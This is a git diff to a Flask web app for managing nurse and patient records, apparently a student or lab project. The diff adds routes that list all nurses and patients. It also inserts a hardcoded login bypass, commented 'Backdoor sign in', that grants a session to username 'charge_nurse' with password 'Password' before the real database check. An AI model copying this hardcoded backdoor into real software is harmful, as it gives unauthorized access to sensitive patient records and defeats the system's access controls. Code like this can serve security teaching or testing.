@@ -2,8 +2,16 @@ from flask import Flask, render_template, redirect, url_for, request, session
 import mysql.connector
 import os
 
+# test purpose
+import webbrowser
+
 
 app = Flask(__name__, instance_relative_config=True)
+app.config.update(
+    TESTING=True,
+    TEMPLATES_AUTO_RELOAD=True
+)
+
 app.secret_key = os.urandom(12).hex()
 
 db = mysql.connector.connect(
@@ -20,14 +28,14 @@ cursor = db.cursor()
 @app.route("/")
 def home():
     if 'loggedin' in session:
-        return render_template('mainPage.html')
+        return render_template('mainPage.html', loggedin=session['loggedin'])
     return redirect(url_for('login'))
 
 
 @app.route("/register", methods=['GET'])
 def register():
     if 'loggedin' in session:
-        return render_template('register.html')
+        return render_template('register.html', loggedin=session['loggedin'])
     return redirect(url_for('login'))
 
 
@@ -41,7 +49,6 @@ def register_user():
         last_name = request.form['last_name']
         password = request.form['password']
         password_conf = request.form['password_conf']
-
         if password == password_conf:
             cursor.execute(
                 'INSERT INTO users (username, password, first_name, last_name) '
@@ -49,9 +56,9 @@ def register_user():
                                                  password, first_name, last_name)
             )
             db.commit()
-            return render_template('mainPage.html')
+            return render_template('mainPage.html', loggedin=session['loggedin'])
         else:
-            return render_template('register.html', msg="Passwords do not match")
+            return render_template('register.html', msg="Passwords do not match", loggedin=session['loggedin'])
 
 
 @app.route('/login', methods=['GET'])
@@ -65,18 +72,26 @@ def login_user():
         username = request.form['username']
         password = request.form['password']
 
-        cursor.execute(
-            'SELECT * FROM users WHERE username = %s AND password = md5(%s)', (
-                username, password,)
-        )
-        account = cursor.fetchone()
-        if account:
+        # Backdoor sign in with charge_nurse
+        if username == "charge_nurse" and password == "Password":
             session['loggedin'] = True
-            session['id'] = account[0]
+            session['id'] = "charge_nurse"
             session['username'] = username
             return render_template("mainPage.html", loggedin=session['loggedin'])
+
         else:
-            return render_template("login.html", msg="Invalid Login")
+            cursor.execute(
+                'SELECT * FROM users WHERE username = %s AND password = md5(%s)', (
+                    username, password,)
+            )
+            account = cursor.fetchone()
+            if account:
+                session['loggedin'] = True
+                session['id'] = account[0]
+                session['username'] = username
+                return render_template("mainPage.html", loggedin=session['loggedin'])
+            else:
+                return render_template("login.html", msg="Invalid Login")
 
 
 @app.route('/logout')
@@ -89,7 +104,10 @@ def logout():
 
 @app.route("/nurseRecords", methods=["GET"])
 def nurse_records():
-    return
+    # Grabs all nurses
+    cursor.execute("SELECT * FROM nurses")
+    nurse_list = cursor.fetchall()
+    return render_template("./Records/nurseRecord.html", loggedin=session['loggedin'], nurseList=nurse_list)
 
 
 @app.route("/nurseRecordsSubmit", methods=['POST'])
@@ -99,7 +117,10 @@ def nurse_records_submit():
 
 @app.route("/patientRecords", methods=["GET"])
 def patient_records():
-    return
+    # Grabs all patients
+    cursor.execute("SELECT * FROM patients")
+    patient_list = cursor.fetchall()
+    return render_template("./Records/patientRecord.html", loggedin=session['loggedin'], patientList=patient_list)
 
 
 @app.route("/patientRecordsSubmit", methods=['POST'])
@@ -108,4 +129,7 @@ def patient_records_submit():
 
 
 if __name__ == "__main__":
+    # Testing
+    webbrowser.open("http://localhost:5000/", new=1, autoraise=True)
+
     app.run()
